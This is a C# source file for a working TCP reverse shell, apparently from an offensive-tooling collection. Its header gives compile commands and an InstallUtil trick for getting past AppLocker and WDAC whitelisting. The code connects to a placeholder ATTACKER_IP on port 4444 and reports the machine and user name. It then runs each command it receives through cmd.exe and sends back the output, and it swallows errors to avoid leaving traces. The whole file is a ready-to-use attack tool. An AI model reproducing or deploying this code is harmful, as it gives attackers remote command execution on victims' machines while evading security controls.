/*
 * C# TCP Reverse Shell — Compile with csc.exe (no dependencies)
 *
 * Useful for .NET thick-client environments where PowerShell is
 * restricted but csc.exe is available (always present with .NET).
 *
 * Compile:
 *   csc.exe /out:shell.exe csharp_revshell.cs
 *   csc.exe /target:library /out:shell.dll csharp_revshell.cs
 *
 * InstallUtil bypass (AppLocker/WDAC):
 *   csc.exe /target:library /out:shell.dll csharp_revshell.cs
 *   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.dll
 *
 * MSBuild inline (no csc needed):
 *   See msbuild_revshell.xml
 */

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

// InstallUtil uninstall bypass — executes on /U flag
[System.ComponentModel.RunInstaller(true)]
public class Bypass : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        ReverseShell.Main(new string[] { });
    }
}

public class ReverseShell
{
    // ──── CHANGE THESE ────
    static string HOST = "ATTACKER_IP";
    static int PORT = 4444;
    // ──────────────────────

    public static void Main(string[] args)
    {
        if (args.Length >= 1) HOST = args[0];
        if (args.Length >= 2) PORT = int.Parse(args[1]);

        try
        {
            using (TcpClient client = new TcpClient(HOST, PORT))
            {
                using (NetworkStream stream = client.GetStream())
                {
                    StreamReader reader = new StreamReader(stream);
                    StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };

                    writer.WriteLine("[+] Connected from " + Environment.MachineName);
                    writer.WriteLine("[+] User: " + Environment.UserDomainName + "\\" + Environment.UserName);
                    writer.Write("PS> ");

                    StringBuilder cmdOutput = new StringBuilder();
                    while (true)
                    {
                        string cmd = reader.ReadLine();
                        if (cmd == null) break;
                        if (cmd.Trim().ToLower() == "exit") break;

                        try
                        {
                            ProcessStartInfo psi = new ProcessStartInfo()
                            {
                                FileName = "cmd.exe",
                                Arguments = "/c " + cmd,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            Process proc = Process.Start(psi);
                            string output = proc.StandardOutput.ReadToEnd();
                            string error = proc.StandardError.ReadToEnd();
                            proc.WaitForExit();

                            if (!string.IsNullOrEmpty(output))
                                writer.Write(output);
                            if (!string.IsNullOrEmpty(error))
                                writer.Write(error);
                        }
                        catch (Exception ex)
                        {
                            writer.WriteLine("[-] Error: " + ex.Message);
                        }

                        writer.Write("PS> ");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // Silently fail — no crash indicators
        }
    }
}
